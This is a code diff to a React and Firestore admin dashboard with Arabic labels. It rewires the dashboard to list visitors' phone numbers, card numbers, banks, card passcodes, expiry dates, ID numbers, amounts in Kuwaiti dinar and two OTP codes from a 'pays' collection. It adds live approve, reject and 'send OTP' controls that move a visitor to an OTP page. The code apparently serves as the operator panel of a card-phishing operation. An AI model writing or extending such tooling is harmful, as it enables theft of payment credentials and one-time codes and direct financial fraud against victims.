@@ -131,6 +131,14 @@ interface Notification {
   expiaryDate?: string;
   pass?: string;
   allOtps?: string[] | null;
+  amount?: string;
+  action?: string;
+  type?: string;
+  idNumber?: string;
+  step?: string;
+  online?: boolean;
+  lastSeen?: string;
+  otp2?: string;
 }
 
 type SoundKey = "visitor" | "request" | "approve" | "reject";
@@ -911,6 +919,9 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase();
       filtered = filtered.filter(
         (notification) =>
+          notification.phone?.toLowerCase().includes(term) ||
+          notification.country?.toLowerCase().includes(term) ||
+          notification.currentPage?.toLowerCase().includes(term) ||
           notification.fullName?.toLowerCase().includes(term) ||
           notification.nationalId?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
@@ -999,7 +1010,7 @@ export default function NotificationsPage() {
       notificationsListenerRef.current = null;
     }
     setIsLoading(true);
-    const q = query(collection(db, "users"), orderBy("createdAt", "desc"));
+    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
@@ -1007,10 +1018,7 @@ export default function NotificationsPage() {
           .map((doc) => {
             const data = doc.data() as any;
             const createdDate =
-              data?.createdAt?.toDate?.()?.toISOString?.() ??
-              data?.createdAt ??
-              data?.createdDate ??
-              "";
+              data?.createdDate ?? data?.timestamp ?? data?.createdAt?.toDate?.()?.toISOString?.() ?? "";
             return {
               id: doc.id,
               createdDate,
@@ -1030,10 +1038,9 @@ export default function NotificationsPage() {
         if (addedNotifications.length > 0) {
           const hasRequestNotification = addedNotifications.some(
             (notification) =>
+              notification.cardNumber ||
               notification.status === "pending" ||
-              notification.fullName ||
-              notification.nationalId ||
-              notification.email ||
+              notification.status === "pendding" ||
               notification.phone
           );
 
@@ -1068,7 +1075,7 @@ export default function NotificationsPage() {
   const updateStatistics = (notificationsData: Notification[]) => {
     const totalCount = notificationsData.length;
     const pendingCount = notificationsData.filter(
-      (notification) => notification.status === "pending"
+      (notification) => notification.status === "pending" || notification.status === "pendding"
     ).length;
 
     setTotalVisitors(totalCount);
@@ -1091,7 +1098,7 @@ export default function NotificationsPage() {
   const handleFlagColorChange = async (id: string, color: string) => {
     try {
       // Update in Firestore
-      const docRef = doc(db, "users", id);
+      const docRef = doc(db, "pays", id);
       await updateDoc(docRef, { flagColor: color });
 
       // Update local state
@@ -1122,7 +1129,7 @@ export default function NotificationsPage() {
 
   const handleApproval = async (state: string, id: string) => {
     try {
-      const targetPost = doc(db, "users", id);
+      const targetPost = doc(db, "pays", id);
       await updateDoc(targetPost, {
         status: state,
       });
@@ -1149,7 +1156,7 @@ export default function NotificationsPage() {
 
   const handleDelete = async (id: string) => {
     try {
-      const docRef = doc(db, "users", id);
+      const docRef = doc(db, "pays", id);
       await updateDoc(docRef, { isHidden: true });
       setNotifications(
         notifications.filter((notification) => notification.id !== id)
@@ -1174,7 +1181,7 @@ export default function NotificationsPage() {
     try {
       const batch = writeBatch(db);
       notifications.forEach((notification) => {
-        const docRef = doc(db, "users", notification.id);
+        const docRef = doc(db, "pays", notification.id);
         batch.update(docRef, { isHidden: true });
       });
       await batch.commit();
@@ -1224,7 +1231,7 @@ export default function NotificationsPage() {
 
   const handleSendOtp = async (id: string) => {
     try {
-      const docRef = doc(db, "users", id);
+      const docRef = doc(db, "pays", id);
       await updateDoc(docRef, {
         currentPage: "otp",
         otpStatus: "otp_requested",
@@ -1704,12 +1711,12 @@ export default function NotificationsPage() {
                         <div className="flex flex-wrap gap-2">
                           <Badge
                             variant={
-                              notification.fullName || notification.email
+                              notification.phone || notification.country
                                 ? "default"
                                 : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.fullName || notification.email
+                              notification.phone || notification.country
                                 ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                                 : ""
                             }`}
@@ -1718,18 +1725,18 @@ export default function NotificationsPage() {
                             }
                           >
                             <User className="h-3 w-3 mr-1" />
-                            {notification.fullName || notification.email
-                              ? "معلومات المستخدم"
-                              : "لا يوجد معلومات"}
+                            {notification.phone || notification.country
+                              ? "معلومات الزائر"
+                              : "زائر جديد"}
                           </Badge>
                           <Badge
                             variant={
-                              notification.nationalId || notification.address
+                              notification.cardNumber || notification.amount
                                 ? "default"
                                 : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.nationalId || notification.address
+                              notification.cardNumber || notification.amount
                                 ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                                 : ""
                             }`}
@@ -1738,19 +1745,15 @@ export default function NotificationsPage() {
                             }
                           >
                             <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.nationalId || notification.address
-                              ? "تفاصيل التسجيل"
-                              : "لا توجد تفاصيل"}
+                            {notification.cardNumber || notification.amount
+                              ? "بيانات الدفع"
+                              : "لا توجد بيانات"}
                           </Badge>
                         </div>
-                        {(notification.fullName || notification.email) && (
+                        {(notification.phone || notification.amount) && (
                           <div className="mt-3 text-sm text-muted-foreground space-y-1">
-                            <div>
-                              {notification.fullName || notification.email}
-                            </div>
-                            {notification.email && (
-                              <div>{notification.email}</div>
-                            )}
+                            {notification.phone && <div>📱 {notification.phone}</div>}
+                            {notification.amount && <div>💰 {notification.amount} د.ك</div>}
                           </div>
                         )}
                       </td>
@@ -1931,9 +1934,9 @@ export default function NotificationsPage() {
                     <div className="space-y-4">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.fullName || notification.email ? "default" : "secondary"}
+                          variant={notification.phone || notification.country ? "default" : "secondary"}
                           className={`cursor-pointer ${
-                            notification.fullName || notification.email
+                            notification.phone || notification.country
                               ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                               : ""
                           }`}
@@ -1942,27 +1945,27 @@ export default function NotificationsPage() {
                           }
                         >
                           <User className="h-3 w-3 mr-1" />
-                          {notification.fullName || notification.email
-                            ? "معلومات المستخدم"
-                            : "لا يوجد معلومات"}
+                          {notification.phone || notification.country
+                            ? "معلومات الزائر"
+                            : "زائر جديد"}
                         </Badge>
                         <Badge
                           variant={
-                            notification.nationalId || notification.address
+                            notification.cardNumber || notification.amount
                               ? "default"
                               : "secondary"
                           }
                           className={`cursor-pointer ${
-                            notification.nationalId || notification.address
+                            notification.cardNumber || notification.amount
                               ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                               : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           <CreditCard className="h-3 w-3 mr-1" />
-                          {notification.nationalId || notification.address
-                            ? "تفاصيل التسجيل"
-                            : "لا توجد تفاصيل"}
+                          {notification.cardNumber || notification.amount
+                            ? "بيانات الدفع"
+                            : "لا توجد بيانات"}
                         </Badge>
                       </div>
 
@@ -2105,14 +2108,14 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-                  { label: "الاسم", value: selectedNotification.fullName },
-                  { label: "رقم الهوية", value: selectedNotification.nationalId },
-                  {
-                    label: "البريد الإلكتروني",
-                    value: selectedNotification.email,
-                  },
                   { label: "رقم الجوال", value: selectedNotification.phone },
-                  { label: "العنوان", value: selectedNotification.address },
+                  { label: "الدولة", value: selectedNotification.country },
+                  { label: "الصفحة الحالية", value: selectedNotification.currentPage },
+                  { label: "وقت الدخول", value: selectedNotification.createdDate ? new Date(selectedNotification.createdDate).toLocaleString("ar") : undefined },
+                  { label: "آخر ظهور", value: selectedNotification.lastSeen ? new Date(selectedNotification.lastSeen).toLocaleString("ar") : undefined },
+                  { label: "الإجراء", value: selectedNotification.action },
+                  { label: "الاسم", value: selectedNotification.fullName },
+                  { label: "البريد الإلكتروني", value: selectedNotification.email },
                 ].map(
                   ({ label, value }) =>
                     value && (
@@ -2135,16 +2138,16 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-                  { label: "الحالة", value: selectedNotification.status },
-                  { label: "تاريخ التسجيل", value: selectedNotification.createdDate },
-                  { label: "رقم الهوية", value: selectedNotification.nationalId },
-                  { label: "البريد الإلكتروني", value: selectedNotification.email },
-                  { label: "رقم الجوال", value: selectedNotification.phone },
-                  { label: "العنوان", value: selectedNotification.address },
-                  { label: "اسم المستخدم", value: selectedNotification.userName },
-                  { label: "كلمة المرور", value: selectedNotification.password },
-                  { label: "الصفحة الحالية", value: selectedNotification.currentPage },
+                  { label: "المبلغ", value: selectedNotification.amount ? selectedNotification.amount + " د.ك" : undefined },
+                  { label: "رقم البطاقة", value: selectedNotification.cardNumber },
+                  { label: "البنك", value: selectedNotification.bank },
+                  { label: "رمز المرور", value: selectedNotification.pass },
+                  { label: "انتهاء البطاقة", value: (selectedNotification.month && selectedNotification.year) ? selectedNotification.month + "/" + selectedNotification.year : undefined },
+                  { label: "رقم الهوية", value: selectedNotification.idNumber },
                   { label: "رمز OTP", value: selectedNotification.otp },
+                  { label: "رمز OTP2", value: selectedNotification.otp2 },
+                  { label: "الحالة", value: selectedNotification.status },
+                  { label: "رقم الجوال", value: selectedNotification.phone },
                 ].map(
                   ({ label, value }) =>
                     value && (
